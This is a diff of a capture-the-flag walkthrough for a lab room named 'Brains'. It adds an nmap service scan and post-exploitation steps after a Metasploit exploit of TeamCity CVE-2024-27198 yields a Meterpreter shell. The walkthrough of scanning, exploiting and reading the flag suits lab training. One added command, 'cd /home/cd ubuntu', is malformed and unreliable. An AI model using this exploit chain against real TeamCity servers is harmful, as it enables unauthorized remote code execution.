@@ -20,9 +20,14 @@ nmap -p- 10.10.252.192
 2. 80/tcp → HTTP (This is the default HTTP port, used to serve websites.)
 3. 50000/tcp → ibm-db2 (detected by default) This is not a common service for this port. In this specific room (Brains), this port is hosting a TeamCity server, vulnerable to CVE-2024-27198.
 
+# Run a targeted service/version scan for PORT 50000 "nmap -sV -p 50000 <Target_IP_Address>"
+```bash
+nmap -sV -p 50000 10.10.252.192
+```
+
 # 2. Second Step: What port should we investigate further + Using Metasploit (msfconsole) to Exploit the TeamCity Vulnerability
 
-*The most interesting one here is Port 50000: even though it's labeled ibm-db2, it actually runs TeamCity, which is vulnerable to authentication bypass and remote code execution (RCE).*
+*The most interesting one here is Port 50000: even though it's labeled ibm-db2, we know now it runs TeamCity, which is vulnerable to authentication bypass and remote code execution (RCE).*
 ```bash
 msfconsole
 ```
@@ -63,5 +68,16 @@ run   #or exploit
 [*] Meterpreter session 1 opened ...
 ```
 *This confirms that you now have a meterpreter shell on the target machine!*
+
+# Now That We Are in Meterpreter...Navigate the file system
+```bash
+cd /home/cd ubuntu
+ls
+```
+*Once you find it, read its contents*
+```bash
+cat flag.txt
+```
+
 
 
